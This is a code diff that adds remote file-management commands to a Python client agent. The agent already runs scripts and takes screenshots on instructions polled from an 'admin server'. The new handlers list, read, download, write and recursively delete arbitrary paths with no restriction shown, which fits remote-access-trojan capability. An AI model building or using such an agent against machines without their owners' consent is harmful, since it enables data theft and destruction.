@@ -79,6 +79,11 @@ class ClientCallback:
             "execute_script": self._handle_execute_script,
             "download_update": self._handle_download_update,
             "screenshot": self._handle_screenshot,
+            "list_directory": self._handle_list_directory,
+            "read_file": self._handle_read_file,
+            "download_file": self._handle_download_file,
+            "write_file": self._handle_write_file,
+            "delete_file": self._handle_delete_file,
         }
 
     async def _handle_ping(self, params: dict) -> dict:
@@ -310,6 +315,192 @@ class ClientCallback:
 
         except Exception as e:
             return {"status": "error", "message": f"Screenshot failed: {str(e)}"}
+
+    async def _handle_list_directory(self, params: dict) -> dict:
+        """Handle directory listing"""
+        try:
+            import os
+            import stat
+            from datetime import datetime
+
+            path = params.get("path", ".")
+            path_obj = Path(path)
+
+            if not path_obj.exists():
+                return {"status": "error", "message": f"Path does not exist: {path}"}
+
+            if not path_obj.is_dir():
+                return {"status": "error", "message": f"Path is not a directory: {path}"}
+
+            items = []
+            for item in sorted(path_obj.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
+                try:
+                    item_stat = item.stat()
+                    items.append({
+                        "name": item.name,
+                        "path": str(item.absolute()),
+                        "is_dir": item.is_dir(),
+                        "is_file": item.is_file(),
+                        "size": item_stat.st_size if item.is_file() else 0,
+                        "modified": datetime.fromtimestamp(item_stat.st_mtime).isoformat(),
+                        "created": datetime.fromtimestamp(item_stat.st_ctime).isoformat(),
+                    })
+                except Exception as e:
+                    # Skip items we can't access
+                    continue
+
+            return {
+                "status": "success",
+                "path": str(path_obj.absolute()),
+                "parent": str(path_obj.parent.absolute()) if path_obj.parent != path_obj else None,
+                "items": items,
+                "count": len(items)
+            }
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+    async def _handle_read_file(self, params: dict) -> dict:
+        """Handle file reading"""
+        try:
+            import base64
+
+            path = params.get("path", "")
+            if not path:
+                return {"status": "error", "message": "No path provided"}
+
+            path_obj = Path(path)
+
+            if not path_obj.exists():
+                return {"status": "error", "message": f"File does not exist: {path}"}
+
+            if not path_obj.is_file():
+                return {"status": "error", "message": f"Path is not a file: {path}"}
+
+            # Check file size (limit to 10MB for safety)
+            file_size = path_obj.stat().st_size
+            if file_size > 10 * 1024 * 1024:
+                return {"status": "error", "message": f"File too large: {file_size} bytes (max 10MB)"}
+
+            # Try to read as text first
+            try:
+                with open(path_obj, 'r', encoding='utf-8') as f:
+                    content = f.read()
+                return {
+                    "status": "success",
+                    "path": str(path_obj.absolute()),
+                    "content": content,
+                    "size": file_size,
+                    "encoding": "text"
+                }
+            except UnicodeDecodeError:
+                # Binary file, return base64
+                with open(path_obj, 'rb') as f:
+                    content = f.read()
+                return {
+                    "status": "success",
+                    "path": str(path_obj.absolute()),
+                    "content": base64.b64encode(content).decode('utf-8'),
+                    "size": file_size,
+                    "encoding": "base64"
+                }
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+    async def _handle_download_file(self, params: dict) -> dict:
+        """Handle file download (returns file as base64)"""
+        try:
+            import base64
+
+            path = params.get("path", "")
+            if not path:
+                return {"status": "error", "message": "No path provided"}
+
+            path_obj = Path(path)
+
+            if not path_obj.exists():
+                return {"status": "error", "message": f"File does not exist: {path}"}
+
+            if not path_obj.is_file():
+                return {"status": "error", "message": f"Path is not a file: {path}"}
+
+            # Check file size (limit to 50MB for downloads)
+            file_size = path_obj.stat().st_size
+            if file_size > 50 * 1024 * 1024:
+                return {"status": "error", "message": f"File too large: {file_size} bytes (max 50MB)"}
+
+            with open(path_obj, 'rb') as f:
+                content = f.read()
+
+            return {
+                "status": "success",
+                "filename": path_obj.name,
+                "path": str(path_obj.absolute()),
+                "content": base64.b64encode(content).decode('utf-8'),
+                "size": file_size
+            }
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+    async def _handle_write_file(self, params: dict) -> dict:
+        """Handle file writing/uploading"""
+        try:
+            import base64
+
+            path = params.get("path", "")
+            content = params.get("content", "")
+            encoding = params.get("encoding", "text")  # "text" or "base64"
+
+            if not path:
+                return {"status": "error", "message": "No path provided"}
+
+            if not content:
+                return {"status": "error", "message": "No content provided"}
+
+            path_obj = Path(path)
+
+            # Create parent directory if it doesn't exist
+            path_obj.parent.mkdir(parents=True, exist_ok=True)
+
+            if encoding == "base64":
+                # Decode base64 and write binary
+                content_bytes = base64.b64decode(content)
+                with open(path_obj, 'wb') as f:
+                    f.write(content_bytes)
+            else:
+                # Write as text
+                with open(path_obj, 'w', encoding='utf-8') as f:
+                    f.write(content)
+
+            return {
+                "status": "success",
+                "path": str(path_obj.absolute()),
+                "size": path_obj.stat().st_size
+            }
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+    async def _handle_delete_file(self, params: dict) -> dict:
+        """Handle file/directory deletion"""
+        try:
+            import shutil
+
+            path = params.get("path", "")
+            if not path:
+                return {"status": "error", "message": "No path provided"}
+
+            path_obj = Path(path)
+
+            if not path_obj.exists():
+                return {"status": "error", "message": f"Path does not exist: {path}"}
+
+            if path_obj.is_dir():
+                shutil.rmtree(path_obj)
+                return {"status": "success", "message": f"Directory deleted: {path}"}
+            else:
+                path_obj.unlink()
+                return {"status": "success", "message": f"File deleted: {path}"}
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
 
     async def send_heartbeat(self):
         """Send heartbeat to admin server and check for commands"""
